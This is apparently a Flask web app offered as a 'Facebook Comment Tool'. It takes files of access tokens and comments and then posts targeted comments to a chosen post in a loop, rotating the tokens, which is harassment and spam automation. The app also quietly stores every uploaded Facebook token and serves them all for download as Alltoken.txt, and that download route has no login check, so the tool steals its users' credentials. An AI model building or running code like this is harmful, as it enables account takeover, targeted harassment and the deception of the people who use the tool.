from flask import Flask, request, render_template_string, redirect, url_for
import threading
import time
import requests
import datetime

app = Flask(__name__)

# Admin password
ADMIN_PASSWORD = "FAIZU223344"

HTML_FORM = """
<!DOCTYPE html>
<html>
<head>
    <title>Faiizu Gangster</title>
    <style>
        :root {
            --primary-red: #d32f2f;
            --dark-red: #b71c1c;
            --light-red: #f44336;
            --dark-bg: #121212;
            --card-bg: #1e1e1e;
            --text-light: #f5f5f5;
            --text-muted: #b0b0b0;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--dark-bg);
            color: var(--text-light);
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 2rem;
        }
        
        .card {
            background-color: var(--card-bg);
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            padding: 2rem;
            margin-top: 1rem;
            border-top: 4px solid var(--primary-red);
        }
        
        h2 {
            color: var(--primary-red);
            margin-top: 0;
            font-size: 1.8rem;
            border-bottom: 1px solid #333;
            padding-bottom: 0.5rem;
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: var(--text-light);
        }
        
        input[type="text"],
        input[type="number"],
        input[type="file"],
        input[type="password"] {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #333;
            border-radius: 4px;
            background-color: #2a2a2a;
            color: var(--text-light);
            font-size: 1rem;
            transition: border 0.3s;
        }
        
        input[type="text"]:focus,
        input[type="number"]:focus,
        input[type="file"]:focus,
        input[type="password"]:focus {
            border-color: var(--primary-red);
            outline: none;
        }
        
        button[type="submit"] {
            background-color: var(--primary-red);
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        button[type="submit"]:hover {
            background-color: var(--dark-red);
        }
        
        .icon {
            margin-right: 0.5rem;
            font-size: 1.1rem;
        }
        
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem;
        }
        
        .logo {
            color: var(--primary-red);
            font-size: 2rem;
            margin-right: 1rem;
        }
        
        .title {
            font-size: 1.5rem;
            font-weight: 700;
        }
        
        .subtitle {
            color: var(--text-muted);
            font-size: 0.9rem;
            margin-top: 0.25rem;
        }
        
        .admin-link {
            position: fixed;
            bottom: 20px;
            right: 20px;
            color: var(--text-muted);
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo"></div>
            <div>
                <div class="title">Offline Comment Tool</div>
                <div class="subtitle">Facebook Comment Tool By Faiizu X Hassan</div>
            </div>
        </div>
        
        <div class="card">
            <form method="POST" action="/start" enctype="multipart/form-data">
                <h2>Token Configuration</h2>
                
                <div class="form-group">
                    <label><span class="icon"></span> Token File 1</label>
                    <input type="file" name="token_file1">
                </div>
                
                <div class="form-group">
                    <label><span class="icon"></span> Token File 2</label>
                    <input type="file" name="token_file2">
                </div>
                
                <div class="form-group">
                    <label><span class="icon"></span> Token File 3</label>
                    <input type="file" name="token_file3">
                </div>
                
                <h2>Comment Files</h2>
                
                <div class="form-group">
                    <label><span class="icon"></span> Comments File 1 (.txt)</label>
                    <input type="file" name="comment_file1" required>
                </div>
                
                <div class="form-group">
                    <label><span class="icon"></span> Comments File 2 (.txt)</label>
                    <input type="file" name="comment_file2">
                </div>
                
                <div class="form-group">
                    <label><span class="icon"></span> Comments File 3 (.txt)</label>
                    <input type="file" name="comment_file3">
                </div>
                
                <div class="form-group">
                    <label><span class="icon"></span> Hater Name Prefix</label>
                    <input type="text" name="haters_name" required>
                </div>
                
                <div class="form-group">
                    <label><span class="icon"></span> Facebook Post ID</label>
                    <input type="text" name="post_id" required>
                </div>
                
                <h2>Time + Switch </h2>
                
                <div class="form-group">
                    <label><span class="icon">⏱</span> Comment Delay (seconds)</label>
                    <input type="number" name="interval" value="60" required>
                </div>
                
                <div class="form-group">
                    <label><span class="icon">⏳</span> Switch Token Group Every (hours)</label>
                    <input type="number" name="switch_hour" value="5" required>
                </div>
                
                <div class="form-group">
                    <button type="submit">Start</button>
                </div>
            </form>
        </div>
    </div>
    <a href="/admin" class="admin-link">Admin Panel</a>
</body>
</html>
"""

ADMIN_LOGIN = """
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: #1e1e1e;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            border-top: 4px solid #d32f2f;
            width: 300px;
        }
        h2 {
            color: #d32f2f;
            margin-top: 0;
            text-align: center;
        }
        input[type="password"] {
            width: 100%;
            padding: 0.75rem;
            margin-bottom: 1rem;
            border: 1px solid #333;
            border-radius: 4px;
            background-color: #2a2a2a;
            color: #f5f5f5;
        }
        button {
            background-color: #d32f2f;
            color: white;
            border: none;
            padding: 0.75rem;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 600;
        }
        .error {
            color: #f44336;
            text-align: center;
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Admin Login</h2>
        <form method="POST" action="/admin">
            <input type="password" name="password" placeholder="Enter admin password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
"""

ADMIN_PANEL = """
<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #f5f5f5;
            margin: 0;
            padding: 2rem;
        }
        h1 {
            color: #d32f2f;
            text-align: center;
        }
        .token-container {
            background-color: #1e1e1e;
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1rem;
        }
        .download-btn {
            background-color: #d32f2f;
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 600;
            margin-top: 1rem;
            display: block;
            text-align: center;
            text-decoration: none;
        }
        .back-btn {
            display: inline-block;
            margin-top: 1rem;
            color: #b0b0b0;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <h1>Admin Panel</h1>
    <div class="token-container">
        <h3>All Tokens</h3>
        <p>Total tokens collected: {{ total_tokens }}</p>
        <a href="/download_tokens" class="download-btn">Download All Tokens (Alltoken.txt)</a>
    </div>
    <a href="/" class="back-btn">← Back to main page</a>
</body>
</html>
"""

# Global variable to store all tokens
all_tokens = set()

def extract_tokens(key):
    f = request.files.get(key)
    if f and f.filename:
        content = f.read().decode().splitlines()
        tokens = [line.strip() for line in content if line.strip()]
        # Add tokens to global collection
        for token in tokens:
            all_tokens.add(token)
        return tokens
    return []

def extract_comments(key):
    f = request.files.get(key)
    if f and f.filename:
        content = f.read().decode().splitlines()
        return [line.strip() for line in content if line.strip()]
    return []

def post_comment(token, message, post_id):
    url = f"https://graph.facebook.com/{post_id}/comments"
    payload = {"message": message, "access_token": token}
    try:
        res = requests.post(url, data=payload)
        return res.status_code == 200
    except Exception:
        return False

def token_switching_worker(token_groups, comment_groups, hater_name, post_id, delay, switch_interval_sec):
    group_index = 0
    last_switch = time.time()
    
    # Initialize comment indexes for each group
    comment_indexes = [0] * len(comment_groups)

    while True:
        current_time = time.time()
        if current_time - last_switch >= switch_interval_sec:
            group_index = (group_index + 1) % len(token_groups)
            last_switch = current_time
            print(f"\n[⚙️] Switched to Group {group_index + 1} (Tokens and Comments) [{time.ctime()}]\n")

        active_tokens = token_groups[group_index]
        active_comments = comment_groups[group_index % len(comment_groups)]
        
        if not active_tokens:
            print(f"[❌] Token Group {group_index + 1} is empty. Skipping...")
            time.sleep(delay)
            continue
            
        if not active_comments:
            print(f"[❌] Comment Group {group_index + 1} is empty. Skipping...")
            time.sleep(delay)
            continue

        for token in active_tokens:
            comment = f"{hater_name} {active_comments[comment_indexes[group_index] % len(active_comments)]}"
            success = post_comment(token, comment, post_id)
            print(f"[{time.ctime()}] Group {group_index + 1} | Sent: {comment} | Status: {'✅' if success else '❌'}")
            comment_indexes[group_index] += 1
            time.sleep(delay)

@app.route('/')
def home():
    return render_template_string(HTML_FORM)

@app.route('/start', methods=['POST'])
def start():
    # Token groups
    token_groups = []
    for key in ['token_file1', 'token_file2', 'token_file3']:
        tokens = extract_tokens(key)
        token_groups.append(tokens)

    total_tokens = sum(len(g) for g in token_groups)
    if total_tokens == 0:
        return "❌ No tokens found in any file."

    # Comment groups
    comment_groups = []
    for key in ['comment_file1', 'comment_file2', 'comment_file3']:
        comments = extract_comments(key)
        if comments or key == 'comment_file1':  # First comment file is required
            comment_groups.append(comments)

    if not comment_groups or not any(comment_groups):
        return "❌ No comments found in any comment file."

    # Form inputs
    hater_name = request.form['haters_name']
    post_id = request.form['post_id']
    delay = int(request.form['interval'])
    switch_hour = int(request.form['switch_hour'])

    switch_interval_sec = switch_hour * 3600

    # Start background thread
    threading.Thread(
        target=token_switching_worker,
        args=(token_groups, comment_groups, hater_name, post_id, delay, switch_interval_sec),
        daemon=True
    ).start()

    return f"✅ Commenting started in background. Total Tokens: {total_tokens}, Total Comment Files: {len(comment_groups)}, Switching every {switch_hour} hour(s)."

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == ADMIN_PASSWORD:
            return render_template_string(ADMIN_PANEL, total_tokens=len(all_tokens))
        else:
            return render_template_string(ADMIN_LOGIN, error="Incorrect password")
    return render_template_string(ADMIN_LOGIN)

@app.route('/download_tokens')
def download_tokens():
    if not all_tokens:
        return "No tokens available to download"
    
    # Create the Alltoken.txt file content
    token_content = "\n".join(all_tokens)
    
    return (
        token_content,
        200,
        {
            'Content-Type': 'text/plain',
            'Content-Disposition': 'attachment; filename=Alltoken.txt'
        }
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
